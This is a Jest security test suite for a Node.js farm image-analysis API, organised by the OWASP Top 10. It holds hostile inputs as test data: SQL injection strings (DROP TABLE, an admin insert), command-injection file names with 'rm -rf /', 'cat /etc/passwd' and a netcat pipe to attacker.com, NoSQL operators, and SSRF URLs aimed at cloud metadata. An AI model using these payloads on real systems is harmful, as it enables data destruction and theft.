const request = require('supertest');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Mock the database
jest.mock('../src/config/database', () => ({
  initializeDatabase: jest.fn().mockResolvedValue(true),
  runQuery: jest.fn(),
  getQuery: jest.fn(),
  allQuery: jest.fn()
}));

const createTestApp = require('./testApp');
const app = createTestApp();

describe('OWASP Top 10 Security Testing Suite', () => {
  let authToken, adminToken;
  
  beforeAll(() => {
    // Create test tokens for different roles
    authToken = jwt.sign(
      { id: 1, email: 'test@example.com', role: 'farmer' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
    
    adminToken = jwt.sign(
      { id: 2, email: 'admin@example.com', role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('A01:2021 – Broken Access Control', () => {
    describe('Horizontal Privilege Escalation', () => {
      it('should prevent access to other users data', async () => {
        const { getQuery } = require('../src/config/database');
        getQuery.mockResolvedValue({ id: 1, email: 'test@example.com' });

        // Try to access another user's data
        const response = await request(app)
          .get('/api/users/999') // Different user ID
          .set('Authorization', `Bearer ${authToken}`)
          .expect(403);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('Access Denied');
      });

      it('should prevent modification of other users profiles', async () => {
        const response = await request(app)
          .put('/api/users/999/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .send({ name: 'Malicious Change' })
          .expect(403);

        expect(response.body.success).toBe(false);
      });
    });

    describe('Vertical Privilege Escalation', () => {
      it('should prevent regular users from accessing admin endpoints', async () => {
        const response = await request(app)
          .get('/api/admin/users')
          .set('Authorization', `Bearer ${authToken}`)
          .expect(403);

        expect(response.body.error).toBe('Access Denied');
        expect(response.body.message).toContain('Required role');
      });

      it('should prevent role elevation through parameter manipulation', async () => {
        const response = await request(app)
          .put('/api/auth/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .send({ 
            name: 'Test User',
            role: 'admin' // Attempt to elevate role
          })
          .expect(400);

        expect(response.body.success).toBe(false);
      });
    });

    describe('Direct Object References', () => {
      it('should prevent access to files not owned by user', async () => {
        const response = await request(app)
          .get('/api/analysis/999/download')
          .set('Authorization', `Bearer ${authToken}`)
          .expect(403);

        expect(response.body.error).toBe('Access Denied');
      });

      it('should validate object ownership in API calls', async () => {
        const response = await request(app)
          .delete('/api/analysis/999')
          .set('Authorization', `Bearer ${authToken}`)
          .expect(403);

        expect(response.body.success).toBe(false);
      });
    });
  });

  describe('A02:2021 – Cryptographic Failures', () => {
    describe('Data in Transit Protection', () => {
      it('should enforce HTTPS in production', async () => {
        const originalEnv = process.env.NODE_ENV;
        process.env.NODE_ENV = 'production';

        const response = await request(app)
          .get('/health-simple')
          .expect(200);

        // Check for security headers that enforce HTTPS
        expect(response.headers['strict-transport-security']).toBeDefined();
        
        process.env.NODE_ENV = originalEnv;
      });

      it('should use secure cookie flags', async () => {
        const { getQuery } = require('../src/config/database');
        getQuery.mockResolvedValue({
          id: 1,
          email: 'test@example.com',
          password: '$2a$10$hashedpassword',
          role: 'farmer',
          is_active: 1
        });

        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'password123'
          });

        const cookies = response.headers['set-cookie'];
        if (cookies) {
          expect(cookies.some(cookie => cookie.includes('HttpOnly'))).toBe(true);
          expect(cookies.some(cookie => cookie.includes('Secure'))).toBe(true);
        }
      });
    });

    describe('Sensitive Data Protection', () => {
      it('should not expose sensitive information in JWT tokens', async () => {
        const decoded = jwt.decode(authToken);
        
        expect(decoded.password).toBeUndefined();
        expect(decoded.hash).toBeUndefined();
        expect(decoded.secret).toBeUndefined();
      });

      it('should not log sensitive information', async () => {
        const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
        
        await request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'secretpassword123'
          });

        const loggedData = consoleSpy.mock.calls.flat().join(' ');
        expect(loggedData).not.toContain('secretpassword123');
        
        consoleSpy.mockRestore();
      });
    });
  });

  describe('A03:2021 – Injection', () => {
    describe('SQL Injection Prevention', () => {
      it('should prevent SQL injection in authentication', async () => {
        const sqlInjectionPayloads = [
          "admin'--",
          "admin' OR '1'='1",
          "admin'; DROP TABLE users; --",
          "admin' UNION SELECT * FROM users --",
          "'; WAITFOR DELAY '00:00:05' --"
        ];

        for (const payload of sqlInjectionPayloads) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: payload,
              password: 'password'
            });

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });

      it('should prevent SQL injection in search parameters', async () => {
        const maliciousQueries = [
          "'; DROP TABLE analysis; --",
          "' UNION SELECT password FROM users --",
          "' OR 1=1 --",
          "'; INSERT INTO users (email, role) VALUES ('hacker@evil.com', 'admin'); --"
        ];

        for (const query of maliciousQueries) {
          const response = await request(app)
            .get('/api/analysis/history')
            .set('Authorization', `Bearer ${authToken}`)
            .query({ search: query })
            .expect(400);

          expect(response.body.error).toBe('Invalid Request');
        }
      });
    });

    describe('NoSQL Injection Prevention', () => {
      it('should prevent NoSQL injection attempts', async () => {
        const noSqlPayloads = [
          { $ne: null },
          { $regex: '.*' },
          { $where: 'function() { return true; }' },
          { $gt: '' }
        ];

        for (const payload of noSqlPayloads) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: payload,
              password: 'password'
            });

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });
    });

    describe('Command Injection Prevention', () => {
      it('should prevent command injection in file names', async () => {
        const commandPayloads = [
          'test.jpg; rm -rf /',
          'test.jpg && cat /etc/passwd',
          'test.jpg | nc attacker.com 4444',
          'test.jpg`whoami`',
          'test.jpg$(id)'
        ];

        for (const payload of commandPayloads) {
          const response = await request(app)
            .post('/api/analysis/analyze')
            .set('Authorization', `Bearer ${authToken}`)
            .attach('image', Buffer.from('fake image data'), payload);

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });
    });
  });

  describe('A04:2021 – Insecure Design', () => {
    describe('Business Logic Flaws', () => {
      it('should prevent analysis without proper authentication', async () => {
        const response = await request(app)
          .post('/api/analysis/analyze')
          .attach('image', Buffer.from('fake image'), 'test.jpg')
          .expect(401);

        expect(response.body.error).toBe('Access Denied');
      });

      it('should prevent bulk operations that could cause DoS', async () => {
        const bulkRequests = Array(20).fill().map(() =>
          request(app)
            .post('/api/analysis/analyze')
            .set('Authorization', `Bearer ${authToken}`)
            .attach('image', Buffer.from('fake image'), 'test.jpg')
        );

        const responses = await Promise.allSettled(bulkRequests);
        const rateLimited = responses.filter(result => 
          result.status === 'fulfilled' && result.value.status === 429
        );

        expect(rateLimited.length).toBeGreaterThan(0);
      });
    });

    describe('Workflow Validation', () => {
      it('should enforce proper sequence in analysis workflow', async () => {
        // Try to get results before uploading image
        const response = await request(app)
          .get('/api/analysis/999/results')
          .set('Authorization', `Bearer ${authToken}`)
          .expect(404);

        expect(response.body.success).toBe(false);
      });
    });
  });

  describe('A05:2021 – Security Misconfiguration', () => {
    describe('Default Configuration Security', () => {
      it('should not expose debug information in production', async () => {
        const originalEnv = process.env.NODE_ENV;
        process.env.NODE_ENV = 'production';

        const response = await request(app)
          .get('/nonexistent-endpoint')
          .expect(404);

        expect(response.body.stack).toBeUndefined();
        expect(response.body.trace).toBeUndefined();
        
        process.env.NODE_ENV = originalEnv;
      });

      it('should have proper security headers configured', async () => {
        const response = await request(app)
          .get('/health-simple')
          .expect(200);

        expect(response.headers['x-content-type-options']).toBe('nosniff');
        expect(response.headers['x-frame-options']).toBe('DENY');
        expect(response.headers['x-xss-protection']).toBe('1; mode=block');
        expect(response.headers['content-security-policy']).toBeDefined();
        expect(response.headers['referrer-policy']).toBeDefined();
      });
    });

    describe('Information Disclosure', () => {
      it('should not expose server version information', async () => {
        const response = await request(app)
          .get('/health-simple')
          .expect(200);

        expect(response.headers['server']).toBeUndefined();
        expect(response.headers['x-powered-by']).toBeUndefined();
      });

      it('should not expose internal error details', async () => {
        const { getQuery } = require('../src/config/database');
        getQuery.mockRejectedValue(new Error('Database connection failed at 192.168.1.100:5432'));

        const response = await request(app)
          .get('/health')
          .expect(503);

        expect(response.body.stack).toBeUndefined();
        expect(JSON.stringify(response.body)).not.toContain('192.168.1.100');
        expect(JSON.stringify(response.body)).not.toContain('5432');
      });
    });
  });

  describe('A06:2021 – Vulnerable and Outdated Components', () => {
    describe('Dependency Security', () => {
      it('should use secure versions of critical libraries', () => {
        const packageJson = require('../package.json');
        
        // Check for known vulnerable versions
        expect(packageJson.dependencies.express).not.toMatch(/^4\.17\.[0-2]$/);
        expect(packageJson.dependencies.jsonwebtoken).not.toMatch(/^8\./);
      });
    });
  });

  describe('A07:2021 – Identification and Authentication Failures', () => {
    describe('Password Security', () => {
      it('should enforce strong password requirements', async () => {
        const weakPasswords = [
          '123456',
          'password',
          'admin',
          'test',
          '12345678',
          'qwerty'
        ];

        for (const password of weakPasswords) {
          const response = await request(app)
            .post('/api/auth/register')
            .send({
              email: 'test@example.com',
              password: password,
              name: 'Test User'
            });

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });

      it('should prevent credential stuffing attacks', async () => {
        const credentials = [
          { email: 'admin@admin.com', password: 'admin' },
          { email: 'test@test.com', password: 'test' },
          { email: 'user@user.com', password: 'user' }
        ];

        for (const cred of credentials) {
          const response = await request(app)
            .post('/api/auth/login')
            .send(cred);

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });
    });

    describe('Session Management', () => {
      it('should invalidate sessions on logout', async () => {
        const { getQuery } = require('../src/config/database');
        getQuery.mockResolvedValue({
          id: 1,
          email: 'test@example.com',
          role: 'farmer',
          is_active: 1
        });

        // Login
        const loginResponse = await request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'password123'
          });

        const token = loginResponse.body.token;

        // Logout
        await request(app)
          .post('/api/auth/logout')
          .set('Authorization', `Bearer ${token}`)
          .expect(200);

        // Try to use the token after logout
        const response = await request(app)
          .get('/api/auth/me')
          .set('Authorization', `Bearer ${token}`)
          .expect(401);

        expect(response.body.success).toBe(false);
      });

      it('should handle concurrent sessions securely', async () => {
        const { getQuery } = require('../src/config/database');
        getQuery.mockResolvedValue({
          id: 1,
          email: 'test@example.com',
          role: 'farmer',
          is_active: 1
        });

        // Create multiple sessions
        const sessions = await Promise.all([
          request(app).post('/api/auth/login').send({
            email: 'test@example.com',
            password: 'password123'
          }),
          request(app).post('/api/auth/login').send({
            email: 'test@example.com',
            password: 'password123'
          })
        ]);

        sessions.forEach(session => {
          expect(session.body.token).toBeDefined();
        });
      });
    });
  });

  describe('A08:2021 – Software and Data Integrity Failures', () => {
    describe('File Integrity', () => {
      it('should validate uploaded file integrity', async () => {
        const corruptedImage = Buffer.from('corrupted data that is not an image');

        const response = await request(app)
          .post('/api/analysis/analyze')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('image', corruptedImage, 'test.jpg')
          .expect(400);

        expect(response.body.success).toBe(false);
      });

      it('should prevent file upload overwrites', async () => {
        const testImage = Buffer.from('fake image data');

        // Upload first file
        await request(app)
          .post('/api/analysis/analyze')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('image', testImage, 'test.jpg');

        // Try to upload with same name
        const response = await request(app)
          .post('/api/analysis/analyze')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('image', testImage, 'test.jpg');

        // Should handle duplicate names gracefully
        expect([200, 400, 409]).toContain(response.status);
      });
    });
  });

  describe('A09:2021 – Security Logging and Monitoring Failures', () => {
    describe('Audit Logging', () => {
      it('should log authentication attempts', async () => {
        const consoleSpy = jest.spyOn(console, 'log').mockImplementation();

        await request(app)
          .post('/api/auth/login')
          .send({
            email: 'nonexistent@example.com',
            password: 'wrongpassword'
          });

        // Should have logged the failed attempt
        expect(consoleSpy).toHaveBeenCalled();
        
        consoleSpy.mockRestore();
      });

      it('should log suspicious activities', async () => {
        const consoleSpy = jest.spyOn(console, 'log').mockImplementation();

        await request(app)
          .get('/api/analysis/history')
          .set('Authorization', `Bearer ${authToken}`)
          .query({ search: "'; DROP TABLE users; --" });

        expect(consoleSpy).toHaveBeenCalled();
        
        consoleSpy.mockRestore();
      });
    });
  });

  describe('A10:2021 – Server-Side Request Forgery (SSRF)', () => {
    describe('URL Validation', () => {
      it('should prevent SSRF through image URLs', async () => {
        const maliciousUrls = [
          'http://localhost:22',
          'http://169.254.169.254/latest/meta-data/',
          'file:///etc/passwd',
          'http://internal-service:8080/admin',
          'ftp://internal.company.com/secrets'
        ];

        for (const url of maliciousUrls) {
          const response = await request(app)
            .post('/api/analysis/analyze-url')
            .set('Authorization', `Bearer ${authToken}`)
            .send({ imageUrl: url });

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });
    });

    describe('Webhook Security', () => {
      it('should validate webhook URLs', async () => {
        const response = await request(app)
          .post('/api/webhooks/register')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            url: 'http://localhost:8080/admin/users',
            events: ['analysis.completed']
          });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });
    });
  });

  describe('Additional Agricultural Security Concerns', () => {
    describe('Data Privacy for Farm Information', () => {
      it('should prevent cross-farm data access', async () => {
        const response = await request(app)
          .get('/api/analytics/farm/999')
          .set('Authorization', `Bearer ${authToken}`)
          .expect(403);

        expect(response.body.error).toBe('Access Denied');
      });

      it('should anonymize sensitive farm data in logs', async () => {
        const consoleSpy = jest.spyOn(console, 'log').mockImplementation();

        await request(app)
          .post('/api/analysis/analyze')
          .set('Authorization', `Bearer ${authToken}`)
          .field('location', 'GPS:40.7128,-74.0060')
          .attach('image', Buffer.from('fake image'), 'test.jpg');

        const loggedData = consoleSpy.mock.calls.flat().join(' ');
        expect(loggedData).not.toContain('40.7128');
        expect(loggedData).not.toContain('-74.0060');
        
        consoleSpy.mockRestore();
      });
    });

    describe('AI Model Security', () => {
      it('should prevent model poisoning through malicious uploads', async () => {
        const maliciousImage = Buffer.from('adversarial_pattern_data');

        const response = await request(app)
          .post('/api/analysis/train')
          .set('Authorization', `Bearer ${adminToken}`)
          .attach('image', maliciousImage, 'poison.jpg')
          .field('label', 'healthy');

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });
    });
  });
});